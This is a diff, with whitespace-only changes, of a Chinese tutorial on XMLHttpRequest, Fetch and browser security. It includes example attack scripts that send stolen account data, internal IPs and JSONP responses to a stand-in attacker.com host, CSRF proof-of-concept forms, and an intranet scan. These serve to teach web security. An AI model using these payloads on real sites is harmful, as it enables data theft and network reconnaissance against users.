@@ -27,11 +27,11 @@ XMLHttpRequest (2000s) → Fetch API (2015) → Axios等库
 
 ```javascript
 // 同步（阻塞UI，已废弃）
-xhr.open('GET', '/api/data', false);  // false = 同步
-xhr.send();  // UI卡住直到请求完成
+xhr.open('GET', '/api/data', false); // false = 同步
+xhr.send(); // UI卡住直到请求完成
 
 // 异步（标准方式）
-xhr.open('GET', '/api/data', true);  // true = 异步
+xhr.open('GET', '/api/data', true); // true = 异步
 xhr.onload = function() { console.log(xhr.responseText); };
 xhr.send();
 ```
@@ -44,12 +44,12 @@ xhr.send();
 const xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://api.example.com/users');
 xhr.setRequestHeader('Content-Type', 'application/json');
-xhr.withCredentials = true;  // 携带Cookie（跨域需要服务器配合CORS）
+xhr.withCredentials = true; // 携带Cookie（跨域需要服务器配合CORS）
 
 xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4 && xhr.status === 200) {
-    console.log(JSON.parse(xhr.responseText));
-  }
+ if (xhr.readyState === 4 && xhr.status === 200) {
+ console.log(JSON.parse(xhr.responseText));
+ }
 };
 
 xhr.send();
@@ -71,13 +71,13 @@ xhr.send();
 // 攻击者脚本：自动发起CSRF请求窃取数据
 const xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://bank.com/api/accounts', true);
-xhr.withCredentials = true;  // 自动带Cookie
+xhr.withCredentials = true; // 自动带Cookie
 xhr.onload = function() {
-  // 把获取的数据发送到攻击者服务器
-  fetch('https://attacker.com/steal', {
-    method: 'POST',
-    body: xhr.responseText
-  });
+ // 把获取的数据发送到攻击者服务器
+ fetch('https://attacker.com/steal', {
+ method: 'POST',
+ body: xhr.responseText
+ });
 };
 xhr.send();
 ```
@@ -88,15 +88,15 @@ xhr.send();
 
 ```javascript
 fetch('https://api.example.com/users', {
-  method: 'GET',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  credentials: 'include',  // 携带Cookie
+ method: 'GET',
+ headers: {
+ 'Content-Type': 'application/json',
+ },
+ credentials: 'include', // 携带Cookie
 })
-  .then(response => response.json())
-  .then(data => console.log(data))
-  .catch(err => console.error(err));
+ .then(response => response.json())
+ .then(data => console.log(data))
+ .catch(err => console.error(err));
 ```
 
 ### credentials选项
@@ -125,7 +125,7 @@ const controller = new AbortController();
 const signal = controller.signal;
 
 fetch('https://api.example.com/data', { signal })
-  .then(response => response.json());
+ .then(response => response.json());
 
 // 5秒后中止
 setTimeout(() => controller.abort(), 5000);
@@ -203,7 +203,7 @@ Access-Control-Allow-Methods: *
 ```html
 <!-- 最简单的CSRF POC -->
 <form action="https://target.com/change_email" method="POST" id="csrf">
-  <input type="hidden" name="email" value="attacker@evil.com">
+ <input type="hidden" name="email" value="attacker@evil.com">
 </form>
 <script>document.getElementById('csrf').submit();</script>
 ```
@@ -213,8 +213,8 @@ Access-Control-Allow-Methods: *
 ```html
 <!-- 发送JSON格式的CSRF（利用fetch API） -->
 <form id="csrf" enctype="text/plain" 
-      action="https://target.com/api/update" method="POST">
-  <input type="hidden" name='{"email":"attacker@evil.com","ignored":"' value='"}'>
+ action="https://target.com/api/update" method="POST">
+ <input type="hidden" name='{"email":"attacker@evil.com","ignored":"' value='"}'>
 </form>
 <script>document.getElementById('csrf').submit();</script>
 <!-- 请求体：{"email":"attacker@evil.com","ignored":"="} -->
@@ -241,11 +241,11 @@ Access-Control-Allow-Methods: *
 
 // 批量内网探测
 for (let i = 1; i <= 254; i++) {
-  let img = new Image();
-  img.src = `http://192.168.0.${i}:80/favicon.ico`;
-  img.onload = function() {
-    fetch('https://attacker.com/alive?ip=192.168.0.' + i);
-  };
+ let img = new Image();
+ img.src = `http://192.168.0.${i}:80/favicon.ico`;
+ img.onload = function() {
+ fetch('https://attacker.com/alive?ip=192.168.0.' + i);
+ };
 }
 ```
 
@@ -258,11 +258,11 @@ pc.createDataChannel('');
 pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
 pc.onicecandidate = function(e) {
-  if (!e.candidate) return;
-  const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-  if (ip) {
-    fetch('https://attacker.com/ip?internal=' + ip[0]);
-  }
+ if (!e.candidate) return;
+ const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+ if (ip) {
+ fetch('https://attacker.com/ip?internal=' + ip[0]);
+ }
 };
 ```
 
@@ -277,12 +277,12 @@ pc.onicecandidate = function(e) {
 
 // 攻击者页面
 <script>
-  function handleResponse(data) {
-    fetch('https://attacker.com/steal', {
-      method: 'POST', 
-      body: JSON.stringify(data)
-    });
-  }
+ function handleResponse(data) {
+ fetch('https://attacker.com/steal', {
+ method: 'POST', 
+ body: JSON.stringify(data)
+ });
+ }
 </script>
 <script src="https://bank.com/api/user?callback=handleResponse"></script>
 ```
